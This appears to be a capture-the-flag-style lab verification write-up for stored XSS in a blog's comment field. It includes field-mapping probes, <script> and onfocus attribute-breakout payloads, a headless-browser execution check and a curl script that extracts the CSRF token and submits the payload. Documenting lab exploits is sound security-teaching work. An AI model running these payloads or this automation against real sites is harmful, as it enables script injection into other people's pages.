# Verification — Stored XSS in comment field

## Methodology
Systematic input→output mapping BEFORE attempting exploitation:
post one comment with a **unique marker** in each field, then grep the re-fetched page
for each marker in its rendered context. This turns "assume the lab title" into
"observe where each input lands."

## Evidence timeline

### 1. Baseline session + CSRF
```
GET /post?postId=1
  → 200, set-cookie: session=<urlsafe base64>; Secure; HttpOnly; SameSite=None
  → page contains <input type="hidden" name="csrf" value="Hh5CI…">
```

### 2. Field-mapping probe (benign, unique markers per field)
```
POST /post/comment
  csrf=<token>, postId=1
  comment=COMMENTPROBE<<<>>>
  name=NAMEPROBE"'<b>
  email=probe@example.com
  website=https://probe.example.com
  → 302 → /post/comment/confirmation?postId=1
```
Rendered output (GET /post?postId=1):
```
<a id="author" href="https://probe.example.com">NAMEPROBE&quot;&apos;&lt;b&gt;</a> | 19 Sep 2026
<p>COMMENTPROBE<<<>>></p>
```
**Readings:**
- `name` → encoded (`" ' < >`) ⇒ NOT a text-context sink.
- `website` → `href` attribute, encoded on output ⇒ attribute breakout blocked server-side.
- `comment` → inside `<p>`, **raw** ⇒ HTML/text-context sink candidate.
- `email` → not reflected at all in this build ⇒ no sink.

### 3. Primary exploit — store alert()
```
POST /post/comment
  comment=<script>alert(1)</script>
  name=Agent, email=agent@example.com, website=https://example.com
  → 302
GET /post?postId=1 → line: <p><script>alert(1)</script></p>
```
Lab banner flips to `is-solved` + "Congratulations".

### 4. Independent proof-of-execution (browser-level, non-intrusive)
Because the stored `alert(1)` blocks a headless dump, a *second, clean* post on a
different post (`postId=2`) was used with a non-blocking probe:
```
comment=<script>document.title='XSSFIRED_ON_POST2'</script>
```
Headless Chromium dump contained `XSSFIRED_ON_POST2` (as `<title>`), proving the
stored script executed inside the real HTML parser on the app origin.
(Also: re-running the dump over post 1 with `alert(1)` present hung until timeout —
consistent with `alert()` blocking the headless renderer, i.e., the alert did fire.)

### 5. Failed-candidate analysis (why the "other" fields fail)
| Attempt | What was sent | Result | Why it failed |
|---|---|---|---|
| XSS via `name` | `NAMEPROBE"'<b>` | `&quot;&apos;&lt;b&gt;` | Server HTML-encodes name (entities) before emitting into `<a>` text |
| XSS via `website` attr | `https://example.com" autofocus onfocus="alert(...)` | `href="https://example.com&quot; autofocus onfocus=&quot;alert(...)"` | Server encodes `"` as `&quot;`; browser decodes it only *inside* the value, so no new attribute is created — character-reference encoding is correct defense for double-quoted attribute values |
| XSS via `email` | probe@example.com | not reflected | HTML contains no sink for email in this build |

Interpretation of "failure": these fields are **not** vulnerable in this build. The
failure analysis is valuable — it tells us the developer's encoding is applied
individually per field and simply missed on `comment`.

## Reproducibility (curl, no browser required)
```
BASE=…; JAR=ck.txt
curl -c $JAR "$BASE/post?postId=1" > a.html
CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' a.html | head -1)
curl -b $JAR -c $JAR \
  --data-urlencode "csrf=$CSRF" \
  --data-urlencode "postId=1" \
  --data-urlencode "comment=<script>alert(1)</script>" \
  --data-urlencode "name=A" --data-urlencode "email=a@b.c" \
  --data-urlencode "website=https://example.com" \
  "$BASE/post/comment"
curl -b $JAR "$BASE/post?postId=1" | grep '<script>alert'
```

## Confirmation criteria
- CONFIRMED: payload stored verbatim; executes in a stock HTML parser on the app origin;
  lab acceptance (`is-solved`).
- Note: alert-dialog verification via automated headless dumps must use a non-blocking
  probe (e.g., `document.title=…`) or a CDP dialog handler — `alert()` freezes headless
  render/dump, which is useful as a *symptom* but not a clean assertion.